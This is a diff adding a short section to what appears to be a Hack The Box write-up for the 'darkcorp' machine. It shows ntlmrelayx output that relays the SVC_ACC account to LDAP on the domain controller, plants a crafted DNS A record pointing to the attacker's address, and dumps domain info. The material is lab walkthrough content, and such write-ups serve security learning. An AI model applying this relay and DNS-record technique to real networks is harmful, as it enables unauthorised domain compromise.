@@ -893,6 +893,27 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Servers started, waiting for connections
 ```
 
+Ill start this up, still with socat running
+
+Ill then send the request again to connect back to drip server
+
+```python
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` record!
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to `10.10.14.61` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Dumping domain info for first time
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain info dumped into lootdir!
+```
+
 
 
 
